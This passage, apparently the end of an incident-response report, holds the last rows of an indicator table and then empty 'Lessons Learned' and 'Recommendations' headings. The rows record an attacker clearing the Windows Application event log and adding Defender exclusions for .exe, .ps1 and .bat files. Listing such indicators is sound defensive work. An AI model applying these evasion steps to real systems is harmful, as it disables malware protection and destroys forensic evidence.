|    Event Log   	|               `Application`               	|              Windows Event log cleared for anti-forensics             	|
| File Extension 	|                   `.exe`                  	|          Defender exclusion added to allow malware execution          	|
| File Extension 	|                   `.ps1`                  	|           Defender exclusion added to allow script execution          	|
| File Extension 	|                   `.bat`                  	|           Defender exclusion added to allow batch execution           	|

  </table>

</details>

## Lessons Learned

## Recommendations
